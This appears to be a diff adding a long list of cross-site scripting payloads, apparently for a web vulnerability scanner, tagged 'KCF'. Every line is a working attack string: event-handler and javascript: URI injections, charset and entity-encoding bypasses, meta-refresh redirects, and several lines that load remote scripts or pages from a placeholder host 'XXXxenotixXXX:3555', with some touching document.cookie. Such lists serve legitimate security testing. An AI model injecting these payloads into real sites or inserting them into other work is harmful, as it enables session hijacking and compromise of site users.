+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('KCF');+ADw-/SCRIPT+AD4-
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%25(payload)s;+ADw-/SCRIPT+AD4-
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="KCF<SCRIPT DEFER>javascript:alert(1)</SCRIPT>"></BODY></HTML>
+<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
+<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
+<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
+<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
+<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
+htmlStr = '<a href="javascript:alert(1)">kcf</a>'; document.getElementById('body').innerHTML = htmlStr; try { alert(1);}catch(e){alert(1);};
+htmlStr = '<a href="javascript:alert(1)">kcf</a>'; document.getElementById('body').innerHTML = htmlStr; try { if(document.getElementById('body').firstChild.protocol === 'javascript:') { alert(1); } }catch(e){alert(1);};
+<HTML xmlns:kcf><?import namespace="kcf" implementation="%25(htc)s"><kcf:kcf>KCF</kcf:kcf></HTML>""","XML namespace."),("""<XML ID="kcf"><I><B><IMG SRC="javas<!-- -->cript:javascript:alert(1)"></B></I></XML><SPAN DATASRC="#KCF" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+http://%22%20onerror=%22alert%281%29;//
+http://www.keralacyberforce<script .in>alert(document.location)</script
+http://www.<script>alert(1)</script .com
+<!--[if gte IE 4]><SCRIPT>alert(1);</SCRIPT><![endif]-->
+<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
+<!--[if<img src=x onerror=alert(2)//]> -->
+<!--[if<img src=x onerror=javascript:alert(1)//]> -->
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<iframe name=x></iframe>"></iframe><a href="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html" target=x id=x></a><script>window.onload=function(){x.click()}</script>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
+<iframe "onload=alert(1)></iframe>
+<iframe/ /onload=alert(1)></iframe>
+<iframe/ "onload=alert(1)></iframe>
+<iframe///////onload=alert(1)></iframe>
+<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<iframe/onreadystatechange=%0061%006C%0065%0072%0074('%0061') worksinIE>
+<iframe onreadystatechange=alert(1)>
+<iframe/onreadystatechange=alert(1)
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
+<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<iframe/src="data:text/html;&Tab;base64&Tab;,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=">
+<iframe srcdoc='<body onload=prompt&lpar;1&rpar;>'>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&lt;img&sol;src=&apos;&apos;onerror=javascript:alert(1)&gt;>">
+<iframe src=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html <
+<iframe src="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html" width="800" height="800">iframe</iframe>
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+<iframe src="javascript:alert(1); <
+<iframe src=javascript:alert(1)>
+<IFRAME SRC="javascript:alert(1);"></IFRAME>
+<IFRAME SRC="javascript:alert('KCF');"></IFRAME>
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
+<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+<iframe src=mhtml:http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.gif!kcf.html></iframe>
+<iframe src=mhtml:http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html!kcf.html></iframe>
+<iframe/src \/\/onload = prompt(1)
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<iframe src="vbscript:alert()></iframe>
+<iframe style="position:absolute;top:0;left:0;width:100%25;height:100%25" onmouseover="prompt(1)">
+<!--[if]><script>alert(1)</script -->
+<!--[if]><script>javascript:alert(1)</script -->
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<image src="javascript:alert(1)">
+<img %00src=x onerror="alert(1)">
+<img %00src=x onerror="javascript:alert(1)">
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<img%10src=x onerror="javascript:alert(1)">
+<img %11src=x onerror="javascript:alert(1)">
+<img%11src=x onerror="javascript:alert(1)">
+<img %12src=x onerror="javascript:alert(1)">
+<img%13src=x onerror="javascript:alert(1)">
+<img%32src=x onerror="javascript:alert(1)">
+<img %34src=x onerror="javascript:alert(1)">
+<img %39src=x onerror="javascript:alert(1)">
+<img %47src=x onerror="javascript:alert(1)">
+<img%47src=x onerror="javascript:alert(1)">
+<img/anyjunk/onerror=alert(1) src=a>
+<img dynsrc="javascript:alert(1);">
+<IMG DYNSRC="javascript:alert(1)">
+<IMG DYNSRC="javascript:alert('KCF')">
+<IMG DYNSRC="javascript:javascript:alert(1)">
+<img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
+<img language=vbs src=<b onerror=alert#1/1#>
+<IMG LOWSRC="javascript:alert(1)">
+<IMG LOWSRC="javascript:alert('KCF')">
+<IMG LOWSRC="javascript:javascript:alert(1)">
+"/><img/onerror=%09javascript:alert(1)%09src=xxx:x />
+"/><img/onerror=%0Ajavascript:alert(1)%0Asrc=xxx:x />
+"/><img/onerror=%0Bjavascript:alert(1)%0Bsrc=xxx:x />
+"/><img/onerror=%0Cjavascript:alert(1)%0Csrc=xxx:x />
+"/><img/onerror=%0Djavascript:alert(1)%0Dsrc=xxx:x />
+"/><img/onerror=%20javascript:alert(1)%20src=xxx:x />
+"/><img/onerror=%22javascript:alert(1)%22src=xxx:x />
+"/><img/onerror=%27javascript:alert(1)%27src=xxx:x />
+"/><img/onerror=%60javascript:alert(1)%60src=xxx:x />
+<img onerror=a&#0108;ert(1) src=a>
+<img onerror=a&#0108ert(1) src=a>
+<img onerror=a&#108;ert(1) src=a>
+<img onerror=a&#108ert(1) src=a>
+<img onerror=`alert(1)`src=a>
+<img onerror=’alert(1)’src=a>
+<img onerror=”alert(1)”src=a>
+<img onerror=alert(1) src=a>
+<img/onerror=alert(1) src=a>
+<img/onerror=alert(1) src=a>
+<img/onerror=alert(1) src=a>
+«img onerror=alert(1) src=a»
+<iMg onerror=alert(1) src=a>
+<img onerror=a&#x0006c;ert(1) src=a>
+<img onerror=a&#x006c;ert(1) src=a>
+<img onerror=a&#x06c;ert(1) src=a>
+<img onerror=MsgBox+1 language=vbs src=a>
+<img onerror=”VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@” src=a>
+<IMG ONERROR=”VBS:EXECSCRIPT LCASE(‘ALERT(1)’)” SRC=A>
+<img onerror=”vbs:MsgBox 1” src=a>
+<IMG ONERROR=”VBS:MSGBOX 1” SRC=A>
+<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
+"`'/><img/onload=alert(1) src=""/>
+<IMG onmouseover="alert('kcf')">
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<IMG """><SCRIPT>alert("KCF")</SCRIPT>">
+<img src=&#0000106&#0000097&#0000118&#0000097 &#0000115&#0000099&#0000114&#0000105&#0000112 &#0000116&#0000058&#0000097&#0000108&#0000101 &#0000114&#0000116&#0000040&#0000039&#0000088 &#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+<img/src=`%00` onerror=this.onerror=confirm(1)
+<img src%00=x onerror="javascript:alert(1)">
+<img src%09=x onerror="javascript:alert(1)">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#75;&#67;&#70;&#39;&#41;&#59;>
+<img src=&#106;&#97;&#118;&#97;&#115;&#99; &#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101; &#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<img src%10=x onerror="javascript:alert(1)">
+<img src%11=x onerror="javascript:alert(1)">
+<img src%12=x onerror="javascript:alert(1)">
+<img src%13=x onerror="javascript:alert(1)">
+<IMG SRC=" &#14;  javascript:alert(1);">
+<IMG SRC=" &#14;  javascript:alert('KCF');">
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<img src="1" onerror="alert(1)">
+<img src=1 onerror="alert(1)">
+<img/src="1"/onerror="alert(1)"
+`"'><img src='#%27 onerror=javascript:alert(1)>
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+<img src%32=x onerror="javascript:alert(1)">
+<img src%47=x onerror="javascript:alert(1)">
+<img src=a onerror=alert(1)
+<img src=a onerror=alert(1) %0A>
+<img src=a onerror=alert(1)%0A>a
+<img src="blah>" onmouseover="alert(1);">
+<img src="blah"onmouseover="alert(1);">
+<img src=foo.png onerror=%61%6C%65%72%74%28%2F%4B%43%46%2F%29/>
+<img src="http://XXXxenotixXXX:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>
+<img src="http://XXXxenotixXXX:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>
+<img src='http://XXXxenotixXXX:3555/xss_serve_payloads/gif.gif' onload='document.scripts(0).src="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"'>
+<img src='http://XXXxenotixXXX:3555/xss_serve_payloads/gif.gif' onload='document.scripts(0).src="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"'>
+<img src="http://XXXxenotixXXX:3555/xss_serve_payloads/image.png" onerror=alert(1)>
+<img src="http://XXXxenotixXXX:3555/xss_serve_payloads/jpg.jpg" onerror=alert(1)>
+<img/src='http://XXXxenotixXXX:3555/xss_serve_payloads/jpg.jpg' onmouseover=&Tab;prompt(1)
+<img src='http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html' onload=alert(1)//></img>
+<img src='http://XXXxenotixXXX:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"'>
+<img src='http://XXXxenotixXXX:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"'>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<img src=”<img src=x”/onerror=alert(1)//”> Jquery: <img/src/onerror=alert(1)>
+<!--<img src="--><img src=x onerror=javascript:alert(1)//">
+<![><img src="]><img src=x onerror=javascript:alert(1)//">
+<img src ?itworksonchrome?\/onerror = alert(1)​​​
+<img src="javascript:alert(1)">
+<IMG SRC=`javascript:alert(1)`>
+<IMG SRC="javascript:alert(1);"
+<IMG SRC="javascript:alert(1);">
+<IMG SRC="javascript:alert(1)"
+<IMG SRC=javascript:alert(1)>
+"><IMG SRC=javascript:alert(1)>
+<IMG SRC=JaVaScRiPt:alert(1)>
+<IMG SRC="javascript:alert('KCF');">
+<IMG SRC="javascript:alert('KCF')"
+<IMG SRC=javascript:alert('KCF')>
+<IMG SRC=javascript:alert("KCF")>
+<IMG SRC=JaVaScRiPt:alert('KCF')>
+<IMG SRC=`javascript:alert("KCF says, 'KCF'")`>
+<IMG SRC=`javascript:alert(“KCF says, ‘KCF’”)`>
+<IMG SRC=`javascript:alert("Kerala Cyber Force, 'KCF'")`>
+<IMG SRC=`javascript:alert("Kerala Cyber Force says, 'KCF'")`>
+<IMG SRC=javascript:alert(&quot;KCF&quot;)>
+<IMG SRC=javascript:alert(String.fromCharCode(75,67,70))>
+<IMG SRC=`javascript:javascript:alert(1)`>
+<IMG SRC="javascript:javascript:alert(1);">
+<IMG SRC="javascript:javascript:alert(1)"
+<IMG SRC=javascript:javascript:alert(1)>
+<img src=kcf onerror=alert(1)>
+<img src ?kcf?\/onerror = alert(1)
+<img src=# onerror%3D"javascript:alert(1)" >
+<img src=/ onerror=alert(1);>
+<img src="" onerror=alert(1)>
+<img src="" onerror=alert(1);>
+<img src=# onerror="alert(1)" >
+"><img src=/ onerror=alert(1);>
+<img src="" onload=alert(1)>
+<IMG SRC=# onmouseover="alert('kcf')">
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img src='vbscript:do%63ument.lo%63ation="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html"'>
+<IMG SRC='vbscript:msgbox(1)'>
+<IMG SRC='vbscript:msgbox("KCF")'>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img src="x:alert" onerror="eval(src%2b'(1)')">
+<IMG SRC=" &#xE;  javascript:alert(1);">
+<img src="x:gif" onerror="eval('al'%2b'lert(1)')">
+<img src="x:gif" onerror="window['al%0065rt'](1)"></img>
+<img src="x:kcf" onerror="alert(1)">
+<img src=\"x:kcf\" onerror=\"alert(1)\">
+<img src=x onerror=%00"javascript:alert(1)">
+<img src=x onerror=%09"javascript:alert(1)">
+<img src=x onerror=%10"javascript:alert(1)">
+<img src=x onerror=%11"javascript:alert(1)">
+<img src=x onerror=%12"javascript:alert(1)">
+<img src=x onerror=%32"javascript:alert(1)">
+<img src=x onError="javascript:alert(1)"/>
+"><img src=x onerror=prompt(1);>
+"><img src=x onerror=window.open('https://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html');>
+"><img src=x onerror=window.open('http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html"');>
+<img src="x:? title=" onerror=alert(1)//">
+><img src="x:x" onerror=alert(1)>
+<img src='xx:x><img src=xx:x onerror=alert(1)>'>
+<img src='xx:x onerror="alert(1)">'>
+<img src='xx:x\ onerror="alert(1)">'>
+<img src=x:xx onerror="try {execScript('a=1','vbs');alert(1);}catch(e){alert(1);}">
+`"'><img src=xxx:x %00onerror=javascript:alert(1)>
+`"'><img src=xxx:x %09onerror=javascript:alert(1)>
+`"'><img src=xxx:x %0Aonerror=javascript:alert(1)>
+`"'><img src=xxx:x %0Bonerror=javascript:alert(1)>
+`"'><img src=xxx:x %0Conerror=javascript:alert(1)>
+`"'><img src=xxx:x %0Donerror=javascript:alert(1)>
+`"'><img src=xxx:x %20onerror=javascript:alert(1)>
+`"'><img src=xxx:x %2Fonerror=javascript:alert(1)>
+<img src=xx:xx alt=`/onerror=alert(1)//`>
+`"'><img src=xxx:x onerror%00=javascript:alert(1)>
+`"'><img src=xxx:x onerror%09=javascript:alert(1)>
+`"'><img src=xxx:x onerror%0A=javascript:alert(1)>
+`"'><img src=xxx:x onerror%0B=javascript:alert(1)>
+`"'><img src=xxx:x onerror%0C=javascript:alert(1)>
+`"'><img src=xxx:x onerror%0D=javascript:alert(1)>
+`"'><img src=xxx:x onerror%20=javascript:alert(1)>
+`"'><img src=xxx:x onerror=alert(1)>
+<!--<img src=xxx:x onerror=alert(1)> -->
+<!-- `<img/src=xx:xx onerror=alert(1)//--!>
+<img src=`xx:xx`onerror=alert(1)>
+<img src=xx:xx onerror=alert(1)>
+<img src=xx:xx onerror =alert(1);>
+<img src=xx:xx# /onerror=alert(1)>
+--><img src=xxx:x onerror=alert(1)> -->
+"'`><img src=xxx:x onerror=alert(1)>
+<img src=xx:xx onerror=alert(1)> <a href=javascript:alert(1)>1</a>
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+<img src=xx:xx onerror=window[['alert']](1)>
+<img src=xx:xx onerror="&#X61;lert(1);alert(1)">
+<img src=xx:xx onerror="x='\',alert(1)//'">
+<IMG STYLE="kcf:expr/*KCF*/ession(alert(1))">
+<IMG STYLE="KCF:expr/*KCF*/ession(alert(1))">
+<IMG STYLE="KCF:expr/*KCF*/ession(alert('KCF'))">
+<IMG STYLE="kcf:expr/*KCF*/ession(javascript:alert(1))">
+<img type=image src=kcf.gif onreadystatechange=alert(1)>
+<?import namespace="t" implementation="#default#time2">
+<?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="KCF<SCRIPT DEFER>alert(&quot;KCF&quot;)</SCRIPT>"></BODY></HTML>
+<input autofocus onfocus=alert(1)>
+<input id='1'><input id=1><script>alert(1)</script>
+<input id=x><input id=x><script>alert(x)</script>
+<input onblur=alert(1) autofocus><input autofocus>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<input onblur=write(1) autofocus><input autofocus>
+<input onfocus=javascript:alert(1) autofocus>
+<input onfocus=write(1) autofocus>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<input type="image" dynsrc="javascript:alert(1);">
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1);">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('KCF');">
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
+<input type=image src=kcf.gif onreadystatechange=alert(1)>
+<input type="text" AUTOFOCUS onfocus=alert(1)>
+<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<input value=<><iframe/src=javascript:confirm(1)
+<isindex action=javascript:alert(1) type=image>
+<isindex type=image src=1 onerror=alert(1)>
+<isindex type=image src=kcf.gif onreadystatechange=alert(1)>
+kcf%20-%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+kcf%20%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+"'`>kcf<div style="font-family:'foo;x:expression(alert(1));/*';">kcf
+"'`>kcf<div style="font-family:'foo'x:expression(alert(1));/*';">kcf
+kcf<div style="x:expression(alert(1))">kcf
+kcf<div style="xexpression(alert(1))">kcf
+<KCF STYLE="behavior: url(%25(htc)s);">
+<KCF STYLE="behavior: url(KCF.htc);">
+<KCF STYLE="kcf:expression(alert(1))">
+<KCF STYLE="KCF:expression(alert(1))">
+<KCF STYLE="KCF:expression(alert('KCF'))">
+<KCF STYLE="kcf:expression(javascript:alert(1))">
+<keygen autofocus onfocus=alert(1)>
+<keygen onfocus=javascript:alert(1) autofocus>
+<LAYER SRC="javascript:alert(1);"></LAYER>
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
+<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
+<LINK REL="stylesheet" HREF="javascript:alert(1);">
+<LINK REL="stylesheet" HREF="javascript:alert('KCF');">
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
+<li style=list-style:url() onerror=alert(1)></li>
+<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%25%3Csvg/%25%3E);visibility:hidden onload=javascript:alert(1)></div>
+<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
+<math><a xlink:href="//XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp">KCF
+<math><a xlink:href="//XXXxenotixXXX:3555/xss_serve_payloads/kcf.js">KCF
+<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
+<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<META HTTP-EQUIV="Link" Content="<%25(css)s>; REL=stylesheet">
+<META HTTP-EQUIV="Link" Content="<javascript:alert(1)>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0.1; URL=javascript:void()//?;URL=javascript:alert(1)//">
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,PHNjcmlwdD5hbGVydCgnS0NGJyk8L3NjcmlwdD4=">
+"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,PHNjcmlwdD5hbGVydCgnS0NGJyk8L3NjcmlwdD4=">
+<meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=">
+"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnS0NGJyk8L3NjcmlwdD4=">
+<meta http-equiv="refresh" content="0; url=data:text/html;blabla,&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('KCF');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
+"><meta http-equiv="refresh" content="0;url=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html"
+"><meta http-equiv="refresh" content="0;url=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html">
+<meta HTTP-EQUIV="REFRESH" content="0; url=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html">
+"><meta HTTP-EQUIV="REFRESH" content="0; url=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('KCF');">
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
+<meta http-equiv=refresh content="javascript:alert('1')">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(1)</SCRIPT>">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('KCF')</SCRIPT>">
